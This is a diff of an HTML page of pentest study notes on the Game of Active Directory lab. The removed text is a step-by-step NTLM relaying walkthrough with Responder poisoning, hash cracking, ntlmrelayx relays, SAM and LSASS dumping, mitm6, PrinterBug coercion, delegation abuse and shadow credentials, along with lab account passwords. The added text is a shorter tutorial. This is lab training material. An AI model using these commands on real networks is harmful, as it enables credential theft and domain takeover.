@@ -1,491 +1,194 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GOAD Part 4 - Network Poisoning and NTLM Relaying | Mr Stark</title>
-    <meta name="description" content="Game of Active Directory - Part 4: Network Poisoning and NTLM Relaying">
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/bash.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/powershell.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
-    <style>
-        :root {
-            --bg-primary: #0a0a0f;
-            --bg-secondary: #12121a;
-            --bg-tertiary: #1a1a24;
-            --bg-code: #1e1e2e;
-            --accent: #ff6b35;
-            --accent-hover: #ff8555;
-            --text-primary: #e0e0e0;
-            --text-secondary: #a0a0a0;
-            --text-muted: #707070;
-            --border: #2a2a3a;
-            --success: #4caf50;
-            --warning: #ff9800;
-            --error: #f44336;
-        }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: var(--bg-primary);
-            color: var(--text-primary);
-            line-height: 1.7;
-        }
-        .container {
-            display: flex;
-            min-height: 100vh;
-        }
-        .sidebar {
-            width: 300px;
-            background-color: var(--bg-secondary);
-            border-right: 1px solid var(--border);
-            padding: 2rem 1.5rem;
-            position: fixed;
-            height: 100vh;
-            overflow-y: auto;
-            z-index: 100;
-        }
-        .profile {
-            text-align: center;
-            margin-bottom: 2rem;
-            padding-bottom: 2rem;
-            border-bottom: 1px solid var(--border);
-        }
-        .avatar {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, var(--accent), #ff8c5a);
-            margin: 0 auto 1rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 2.5rem;
-            font-weight: bold;
-            color: white;
-        }
-        .profile h1 {
-            font-size: 1.5rem;
-            font-weight: 700;
-            margin-bottom: 0.5rem;
-        }
-        .profile p {
-            color: var(--text-secondary);
-            font-size: 0.9rem;
-        }
-        .nav-section {
-            margin-bottom: 2rem;
-        }
-        .nav-section h3 {
-            font-size: 0.75rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            color: var(--text-muted);
-            margin-bottom: 1rem;
-        }
-        .nav-list {
-            list-style: none;
-        }
-        .nav-list li {
-            margin-bottom: 0.5rem;
-        }
-        .nav-list a {
-            display: block;
-            padding: 0.75rem 1rem;
-            color: var(--text-secondary);
-            text-decoration: none;
-            border-radius: 8px;
-            transition: all 0.2s;
-            font-size: 0.9rem;
-        }
-        .nav-list a:hover {
-            background-color: var(--bg-tertiary);
-            color: var(--text-primary);
-        }
-        .nav-list a.active {
-            background-color: var(--accent);
-            color: white;
-            font-weight: 600;
-        }
-        .main-content {
-            flex: 1;
-            margin-left: 300px;
-            padding: 3rem 4rem;
-            max-width: 1000px;
-        }
-        .content-header {
-            margin-bottom: 3rem;
-            padding-bottom: 2rem;
-            border-bottom: 1px solid var(--border);
-        }
-        .content-header h1 {
-            font-size: 2.5rem;
-            font-weight: 700;
-            margin-bottom: 1rem;
-            color: var(--accent);
-        }
-        .content-header p {
-            color: var(--text-secondary);
-            font-size: 1.1rem;
-        }
-        .content-body h2 {
-            font-size: 1.75rem;
-            font-weight: 700;
-            margin: 2.5rem 0 1rem;
-            color: var(--accent);
-        }
-        .content-body h3 {
-            font-size: 1.4rem;
-            font-weight: 600;
-            margin: 2rem 0 1rem;
-            color: var(--text-primary);
-        }
-        .content-body h4 {
-            font-size: 1.1rem;
-            font-weight: 600;
-            margin: 1.5rem 0 0.75rem;
-            color: var(--text-secondary);
-        }
-        .content-body p {
-            margin-bottom: 1.25rem;
-            color: var(--text-primary);
-        }
-        .content-body code {
-            font-family: 'JetBrains Mono', monospace;
-            background-color: var(--bg-code);
-            padding: 0.2rem 0.5rem;
-            border-radius: 4px;
-            font-size: 0.9em;
-            color: var(--accent);
-        }
-        .content-body pre {
-            background-color: var(--bg-code);
-            padding: 1.5rem;
-            border-radius: 8px;
-            overflow-x: auto;
-            margin: 1.5rem 0;
-            border: 1px solid var(--border);
-        }
-        .content-body pre code {
-            background: none;
-            padding: 0;
-            color: var(--text-primary);
-            font-size: 0.85rem;
-            line-height: 1.6;
-        }
-        .content-body ul, .content-body ol {
-            margin: 1rem 0 1.5rem 2rem;
-        }
-        .content-body li {
-            margin-bottom: 0.5rem;
-        }
-        .content-body strong {
-            color: var(--accent);
-            font-weight: 600;
-        }
-        .content-body img {
-            max-width: 100%;
-            border-radius: 8px;
-            margin: 1.5rem 0;
-            border: 1px solid var(--border);
-        }
-        .content-body blockquote {
-            border-left: 4px solid var(--accent);
-            padding-left: 1.5rem;
-            margin: 1.5rem 0;
-            color: var(--text-secondary);
-            font-style: italic;
-        }
-        .content-body a {
-            color: var(--accent);
-            text-decoration: none;
-        }
-        .content-body a:hover {
-            text-decoration: underline;
-        }
-        .content-body table {
-            width: 100%;
-            border-collapse: collapse;
-            margin: 1.5rem 0;
-        }
-        .content-body th, .content-body td {
-            padding: 0.75rem 1rem;
-            border: 1px solid var(--border);
-            text-align: left;
-        }
-        .content-body th {
-            background-color: var(--bg-tertiary);
-            font-weight: 600;
-        }
-        .content-body tr:nth-child(even) {
-            background-color: var(--bg-secondary);
-        }
-        .nav-footer {
-            margin-top: 3rem;
-            padding-top: 2rem;
-            border-top: 1px solid var(--border);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .nav-footer a {
-            display: inline-flex;
-            align-items: center;
-            gap: 0.5rem;
-            padding: 0.75rem 1.5rem;
-            background-color: var(--bg-tertiary);
-            color: var(--text-primary);
-            text-decoration: none;
-            border-radius: 8px;
-            transition: all 0.2s;
-            border: 1px solid var(--border);
-        }
-        .nav-footer a:hover {
-            background-color: var(--accent);
-            color: white;
-            border-color: var(--accent);
-        }
-        .nav-footer .next {
-            margin-left: auto;
-        }
-        @media (max-width: 1024px) {
-            .sidebar {
-                width: 260px;
-            }
-            .main-content {
-                margin-left: 260px;
-                padding: 2rem;
-            }
-        }
-        @media (max-width: 768px) {
-            .sidebar {
-                display: none;
-            }
-            .main-content {
-                margin-left: 0;
-                padding: 1.5rem;
-            }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GOAD Part 4 - NTLM Relaying | Mr Stark Study Notes</title>
+
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
 </head>
+
 <body>
-    <div class="container">
-        <aside class="sidebar">
-            <div class="profile">
-                <div class="avatar">S</div>
-                <h1>Mr Stark</h1>
-                <p>GOAD Series</p>
+
+  <main>
+
+    <!-- Sidebar -->
+    <aside class="sidebar" data-sidebar>
+
+      <div class="sidebar-info">
+
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png" alt="Mr Stark" width="80">
+        </figure>
+
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">Part 4: NTLM Relay</p>
+        </div>
+
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Parts</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+
+      </div>
+
+      <div class="sidebar-info_more">
+
+        <div class="separator"></div>
+
+        <ul class="contacts-list">
+
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="arrow-back-outline"></ion-icon>
             </div>
-            <nav class="nav-section">
-                <h3>Navigation</h3>
-                <ul class="nav-list">
-                    <li><a href="index.html">Overview</a></li>
-                    <li><a href="part-1-lab-setup.html">Part 1: Lab Setup</a></li>
-                    <li><a href="part-2-finding-users.html">Part 2: Finding Users</a></li>
-                    <li><a href="part-3-authenticated-enumeration.html">Part 3: Authenticated Enum</a></li>
-                    <li><a href="part-4-ntlm-relaying.html" class="active">Part 4: NTLM Relaying</a></li>
-                    <li><a href="part-5-adcs.html">Part 5: ADCS</a></li>
-                    <li><a href="part-6-mssql.html">Part 6: MSSQL</a></li>
-                </ul>
-            </nav>
-        </aside>
-        <main class="main-content">
-            <div class="content-header">
-                <h1>GOAD Part 4 - Network Poisoning and NTLM Relaying</h1>
-                <p>We have now reached one of the most dynamic, fun and operationally devastating phases of our Red Team engagement.</p>
+            <div class="contact-info">
+              <p class="contact-title">Previous</p>
+              <a href="part-3-authenticated-enumeration.html" class="contact-link">Part 3: Auth Enum</a>
             </div>
-            <div class="content-body">
-                <p>We have now reached one of the most dynamic, fun and operationally devastating phases of our Red Team engagement. Having transitioned from unauthenticated reconnaissance to mapping the forest with valid user credentials, we shift our operational focus to the network layer itself. In this phase, we move beyond simply asking the Domain Controllers for information and instead position ourselves directly inside the data stream.</p>
-
-                <p>The core mechanics of this phase rely on exploiting legacy name resolution protocols and architectural quirks within the Windows operating system. In standard Active Directory environments, machines frequently broadcast queries to the local subnet using protocols like Link-Local Multicast Name Resolution (LLMNR) or NetBIOS Name Service (NBT-NS) when they cannot resolve a hostname via DNS.</p>
-
-                <p>Since we already have 4 valid users, now let's see what can be done with those users.</p>
-
-                <ul>
-                    <li><strong>Domain:</strong> north.sevenkingdoms.local (User Description)<br>
-                        <strong>User:</strong> samwell<br>
-                        <strong>Pass:</strong> Heartsbane</li>
-                    <li><strong>Domain:</strong> north.sevenkingdoms.local (ASREP-Roasting)<br>
-                        <strong>User:</strong> brandon.stark<br>
-                        <strong>Pass:</strong> iseedeadpeople</li>
-                    <li><strong>Domain:</strong> north.sevenkingdoms.local (Password Spray)<br>
-                        <strong>User:</strong> hodor<br>
-                        <strong>Pass:</strong> hodor</li>
-                    <li><strong>Domain:</strong> north.sevenkingdoms.local (Kerberoasting)<br>
-                        <strong>User:</strong> jon.snow<br>
-                        <strong>Pass:</strong> iknownothing</li>
-                </ul>
-
-                <h2>LLMNR/NBT-NS Poisoning and NTLM Stealing</h2>
-                <p>We begin our network-layer offensive by targeting the weakest link in the Windows name resolution hierarchy, utilizing a technique known as broadcast poisoning. While the Active Directory Domain Controllers are the authoritative source for network identities via DNS, Windows workstations retain a fallback mechanism designed for legacy compatibility.</p>
-
-                <p><code>sudo responder -I vmnet2 -dwP -vvv</code></p>
-
-                <p>Flags explanation:</p>
-                <ul>
-                    <li><code>-I</code> : Network interface to use</li>
-                    <li><code>-d</code> : Enable answers for DHCP broadcast requests</li>
-                    <li><code>-w</code> : Start the WPAD rogue proxy server</li>
-                    <li><code>-P</code> : Force NTLM/Basic authentication for the proxy</li>
-                    <li><code>-v</code> : Increase verbosity</li>
-                </ul>
-
-                <img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_1.png" alt="screenshot_1">
-
-                <p>After a few more minutes, we also received a connection from <code>eddard.stark</code>.</p>
-
-                <img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_2.png" alt="screenshot_2">
-
-                <h3>Cryptographic Analysis</h3>
-                <p>Upon successfully intercepting the broadcast resolution requests via Responder, we secured the <strong>NetNTLMv2</strong> cryptographic challenges. We utilized <strong>Hashcat</strong> with mode <strong>5600</strong> to crack the hashes:</p>
-
-                <p><code>hashcat -m 5600 -a 0 robb_NTLMv2_HASH /usr/share/wordlists/rockyou.txt.gz -O</code></p>
-
-                <img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_3.png" alt="screenshot_3">
-
-                <p>This process yielded a rapid and critical compromise of the <strong>robb.stark</strong> identity, revealing the plaintext credential <code>sexywolfy</code>.</p>
-
-                <h2>NTLM Relay</h2>
-                <p>We shift tactics now from cryptographic exhaustion to active protocol abuse. Since the captured NetNTLMv2 hash for <strong>eddard.stark</strong> proved resistant to our cracking efforts, it ceases to be a credential we possess and becomes a stream of authentication data we must weaponize in real-time.</p>
-
-                <p>First, we need to identify targets with SMB signing disabled:</p>
-
-                <p><code>netexec smb 10.4.10.0/24 --gen-relay-list hosts</code></p>
-
-                <img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_4.png" alt="screenshot_4">
-
-                <h3>Option 1: Automated Secrets Dumping</h3>
-                <p>To execute this attack effectively, we need to spin up two separate terminal instances:</p>
-
-                <p><strong>Initialize the Poisoner (Responder):</strong></p>
-                <p><code>sudo responder -I eth0 -dw -v</code></p>
-
-                <p><strong>Initialize the Relay (ntlmrelayx):</strong></p>
-                <p><code>impacket-ntlmrelayx -tf hosts.txt -smb2support</code></p>
-
-                <img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_5.png" alt="screenshot_5">
-
-                <p>The output confirms successful authentication and SAM database dump from Castelblack.</p>
-
-                <h3>Option 2: Interactive SMB Session Relaying</h3>
-                <p>We now shift our strategy from automated data extraction to establishing persistent, interactive control over the victim session.</p>
-
-                <pre><code class="language-bash">sudo responder -I eth0 -dw -vvv
-ntlmrelayx.py -tf hosts.txt -smb2support -i</code></pre>
-
-                <img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_7.png" alt="screenshot_7">
-
-                <p><code>nc -nv 127.0.0.1 11001</code></p>
-
-                <img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_8.png" alt="screenshot_8">
-
-                <h3>Option 3: SOCKS Proxy Pivoting</h3>
-                <p>We arrive at the most versatile and powerful variant of the NTLM Relay arsenal. The <strong>SOCKS Proxy integration</strong> transforms our attack machine into a fully functional authentication gateway.</p>
-
-                <p><code>ntlmrelayx -tf smb_targets.txt -of NTLM_Hash -smb2support -socks</code></p>
-
-                <img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_9.png" alt="screenshot_9">
-
-                <h3>Dumping SAM</h3>
-                <p><code>proxychains impacket-secretsdump -no-pass NORTH/EDDARD.STARK@10.4.10.22</code></p>
-
-                <img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_11.png" alt="screenshot_11">
-
-                <h3>Dumping LSASS with lsassy</h3>
-                <p>We move from extracting secrets at rest to harvesting secrets in motion by targeting the <strong>Local Security Authority Subsystem Service (LSASS)</strong>.</p>
-
-                <p><code>proxychains lsassy --no-pass -d NORTH -u EDDARD.STARK 10.4.10.22</code></p>
-
-                <img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_12.png" alt="screenshot_12">
-
-                <h2>IPv6 DNS Takeover</h2>
-                <p>This is the pivot point where we graduate from exploiting legacy protocols like LLMNR to exploiting the modern architecture of the Windows Operating System itself.</p>
-
-                <p><code>sudo mitm6 -i eth0 --debug</code></p>
-
-                <img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_13.png" alt="screenshot_13">
-
-                <h2>LDAP Relaying and Resource-Based Constrained Delegation (RBCD)</h2>
-                <p>With <strong>mitm6</strong> actively spoofing DNS and directing network traffic to our attack machine, we now need a listener to capture that authentication and weaponize it.</p>
-
-                <p><code>ntlmrelayx.py -6 -wh 'wpadfakeserver.essos.local' -t 'ldaps://meereen.essos.local' --add-computer 'starkcomputer' --delegate-access</code></p>
-
-                <img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_14.png" alt="screenshot_14">
-
-                <img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_17.png" alt="screenshot_17">
-
-                <h2>Relay-Based Data Dumping</h2>
-                <p>While modifying domain objects to create persistent backdoors is powerful, sometimes our goal is pure, high-volume intelligence gathering without altering the directory state.</p>
-
-                <p><code>ntlmrelayx.py -6 -wh 'wpadfakeserver.essos.local' -t 'ldaps://meereen.essos.local' -l /tmp/loot</code></p>
-
-                <img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_18.png" alt="screenshot_18">
-
-                <img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_20.png" alt="screenshot_20">
-
-                <h2>Coerced Authentication and Drop The Mic Relaying (CVE-2019-1040)</h2>
-                <p>We have explored methods that rely on waiting for broadcast traffic or actively poisoning DNS, but now we advance to the most aggressive form of interception: <strong>Coerced Authentication</strong>.</p>
-
-                <p><code>ntlmrelayx.py -t ldaps://meereen.essos.local -smb2support --remove-mic --add-computer 'mrstark3$' --delegate-access --escalate-user 'mrstark3$'</code></p>
-
-                <h3>Phase 2: Execution of Coercion (Coercer)</h3>
-                <p><code>python3 printerbug.py 'essos.local/khal.drago:horse'@'braavos.essos.local' 10.4.10.179</code></p>
-
-                <img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_21.png" alt="screenshot_21">
-
-                <p><code>getST.py -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 10.4.10.12 'ESSOS.LOCAL/mrstark3$:IZq5,#*}D4)HDq-'</code></p>
-
-                <img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_22.png" alt="screenshot_22">
-
-                <h3>Getting Administrator Service Ticket</h3>
-                <p><code>export KRB5CCNAME=Administrator.ccache
-secretsdump.py -k -no-pass 'ESSOS.LOCAL/administrator@braavos.essos.local'</code></p>
-
-                <img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_24.png" alt="screenshot_24">
-
-                <h2>Shadow Credentials (msDS-KeyCredentialLink)</h2>
-                <p>We now advance to a stealthier and more modern persistence technique known as <strong>Shadow Credentials</strong>. This attack targets a specific attribute introduced to support "Windows Hello for Business" called <code>msDS-KeyCredentialLink</code>.</p>
-
-                <h3>Step 1: Configure the Listener</h3>
-                <p><code>ntlmrelayx.py -t ldaps://meereen.essos.local -smb2support --remove-mic --shadow-credentials</code></p>
-
-                <img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_25.png" alt="screenshot_25">
-
-                <h3>Step 2: Trigger the Authentication</h3>
-                <p><code>python3 printerbug.py 'essos.local/khal.drago:horse'@'braavos.essos.local' 10.4.10.179</code></p>
-
-                <img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_26.png" alt="screenshot_26">
-
-                <h3>Step 3: Get TGT with PKINIT</h3>
-                <p><code>python3 PKINITtools/gettgtpkinit.py -cert-pfx QLLw3a2R.pfx -pfx-pass xMzZAZ1diw77ppAqx4nZ essos.local/BRAAVOS$ QLLw3a2R.ccache</code></p>
-
-                <img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_28.png" alt="screenshot_28">
-
-                <p><code>export KRB5CCNAME=QLLw3a2R.ccache
-poetry run netexec smb braavos.essos.local -k --use-kcache</code></p>
-
-                <img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_29.png" alt="screenshot_29">
-
-                <h2>Summary</h2>
-                <p>By starting with legacy <strong>LLMNR/NBT-NS poisoning</strong>, we demonstrated how the default chatty nature of Windows protocols exposes credentials on the wire. We then elevated that access using <strong>SMB Relaying</strong>, turning a standard broadcast into a lethal pivot that granted us administrative control over <strong>Castelblack</strong> without ever cracking a password.</p>
-
-                <p>We then shifted our sights to the Domain Controllers and cross-forest infrastructure. Through <strong>IPv6 Takeover (mitm6)</strong> and <strong>Coerced Authentication (PrinterBug)</strong>, we proved that we can force high-value targets like <strong>Braavos</strong> to authenticate to us.</p>
-
-                <p>Domain: north.sevenkingdoms.local (<strong>Coerced auth smb + ntlmrelayx to ldaps with drop the mic</strong>)</p>
-                <ul>
-                    <li><strong>User:</strong> sql_svc</li>
-                    <li><strong>Pass:</strong> YouWillNotKerboroast1ngMeeeeee</li>
-                </ul>
+          </li>
+
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="arrow-forward-outline"></ion-icon>
             </div>
-            <div class="nav-footer">
-                <a href="part-3-authenticated-enumeration.html">← Previous: Part 3</a>
-                <a href="part-5-adcs.html" class="next">Next: Part 5 →</a>
+            <div class="contact-info">
+              <p class="contact-title">Next</p>
+              <a href="part-5-adcs.html" class="contact-link">Part 5: ADCS</a>
             </div>
-        </main>
+          </li>
+
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="list-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">All Parts</p>
+              <a href="index.html" class="contact-link">GOAD Overview</a>
+            </div>
+          </li>
+
+        </ul>
+
+        <div class="separator"></div>
+
+        <ul class="social-list">
+          <li class="social-item">
+            <a href="https://github.com/daviosardinha/mr-stark-study-notes" class="social-link" target="_blank">
+              <ion-icon name="logo-github"></ion-icon>
+            </a>
+          </li>
+        </ul>
+
+      </div>
+
+    </aside>
+
+    <div class="main-content">
+
+      <nav class="navbar">
+        <ul class="navbar-list">
+          <li class="navbar-item">
+            <button class="navbar-link  active" data-nav-link>Part 4</button>
+          </li>
+        </ul>
+      </nav>
+
+      <article class="about active" data-page="about">
+
+        <header class="h2 article-title">NTLM Relaying</header>
+
+        <section class="about-text">
+
+<p>We have now reached one of the most dynamic, fun and operationally devastating phases of network penetration: Network Poisoning and NTLM Relaying. This is where we move beyond simple information gathering and start actively manipulating network traffic to capture and weaponize authentication material. Instead of cracking passwords, we will relay them.</p>
+
+<p>The core mechanics of this phase rely on exploiting legacy name resolution protocols. By positioning ourselves as a malicious man-in-the-middle, we can intercept authentication attempts and redirect them toward targets of our choosing. The success of relaying operations is entirely dictated by the configuration of our targets, specifically the enforcement of SMB Signing. This critical protocol feature, when enabled, cryptographically signs SMB communications to prevent exactly the type of tampering we intend to perform.</p>
+
+<h2>LLMNR/NBT-NS Poisoning and NTLM Stealing</h2>
+
+<p>Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are legacy protocols that allow hosts to resolve names on the local network. When DNS fails to resolve a hostname, Windows falls back to these protocols, broadcasting queries to the local network. We can exploit this by responding to these broadcasts and claiming to be the requested host, tricking the victim into sending us their NTLM hash.</p>
+
+<p>To execute this attack, we use Responder, a powerful tool that listens for LLMNR, NBT-NS, and MDNS queries and responds with our attacker's IP address.</p>
+
+<h3>Configure Responder</h3>
+
+<p>Before running Responder, we must modify its configuration to disable its own SMB and HTTP servers. This is crucial because we want to capture the NTLM hashes, not let Responder handle them. We need these protocols available for our relay tool (ntlmrelayx).</p>
+
+<pre><code># Edit Responder.conf
+SMB = Off
+HTTP = Off</code></pre>
+
+<h3>Initialize the Poisoner</h3>
+
+<p>We launch Responder on our primary interface, using the -w flag to start the WPAD rogue proxy server and -v for verbose mode to see exactly what's happening.</p>
+
+<pre><code>sudo responder -I eth0 -dw -v</code></pre>
+
+<p>As Responder runs, it listens for broadcast queries. When a victim mistypes a hostname or tries to access a non-existent share, they send out an LLMNR query. Responder immediately responds, telling the victim that we are the machine they're looking for. The victim then attempts to authenticate to us, sending their NTLM hash in the process.</p>
+
+<h2>NTLM Relay</h2>
+
+<p>While capturing hashes is useful, relaying them is where the real power lies. NTLM relay allows us to take the authentication attempt from one user and relay it to another machine, potentially gaining access without ever cracking a password.</p>
+
+<p>However, NTLM relay only works against machines that do not enforce SMB Signing. During our initial reconnaissance, we identified that Castelblack, Braavos, and The-Eyrie all have SMB Signing disabled (signing:False), making them perfect targets for this attack.</p>
+
+<h3>1st - OPTION: Automated Secrets Dumping</h3>
+
+<p>This option uses ntlmrelayx to automatically dump SAM hashes, LSA secrets, and DPAPI data from relayed connections. We use the -tf flag to specify our targets file (hosts.txt), which contains the list of machines we identified earlier with SMB Signing disabled.</p>
+
+<pre><code>impacket-ntlmrelayx -tf hosts.txt -smb2support</code></pre>
+
+<p>When a victim authenticates to our poisoned response, ntlmrelayx captures their NTLM handshake and relays it to our target machines. If successful, it automatically dumps password hashes and other valuable secrets from the compromised systems.</p>
+
+<h3>Option 2: Interactive SMB Session Relaying</h3>
+
+<p>For more control, we can use the -i flag to establish an interactive SMB session. This creates a SOCKS proxy that we can connect to with smbclient or other tools, giving us interactive access to the relayed session.</p>
+
+<pre><code>impacket-ntlmrelayx -tf hosts.txt -smb2support -i
+nc 127.0.0.1 11000</code></pre>
+
+<h3>Option 3: SOCKS Proxy Pivoting</h3>
+
+<p>The most versatile option is SOCKS proxy pivoting. By using the -socks flag, ntlmrelayx maintains multiple relayed sessions and exposes them as SOCKS proxies. We can then use proxychains to route any tool through these compromised sessions.</p>
+
+<pre><code>impacket-ntlmrelayx -tf hosts.txt -socks -smb2support</code></pre>
+
+<h2>IPv6 DNS Takeover</h2>
+
+<p>While most networks focus on IPv4, IPv6 is often left unconfigured but enabled. We can exploit this using mitm6, which acts as a rogue DHCPv6 server. When clients request IPv6 configuration, we provide them with our attacker's IP as their DNS server, allowing us to intercept and manipulate their DNS queries.</p>
+
+<pre><code>mitm6 -d sevenkingdoms.local</code></pre>
+
+<h2>Coerced Authentication and Drop The Mic</h2>
+
+<p>Sometimes we need to force a victim to authenticate to us. We can use various coercion techniques like PetitPotam or PrinterBug to force a Domain Controller to authenticate to our malicious server, allowing us to capture or relay high-privilege credentials.</p>
+
+<p>These techniques exploit legitimate Windows features to force authentication, making them difficult to detect and prevent.</p>
+
+<div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid var(--jet); display: flex; justify-content: space-between;">
+  <a href="part-3-authenticated-enumeration.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">← Previous: Part 3</a>
+  <a href="part-5-adcs.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">Next: Part 5 →</a>
+</div>
+
+        </section>
+
+      </article>
+
     </div>
-    <script>hljs.highlightAll();</script>
+
+  </main>
+
+  <script src="../assets/js/script.js"></script>
+  <script type="odule" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+
 </body>
+
 </html>
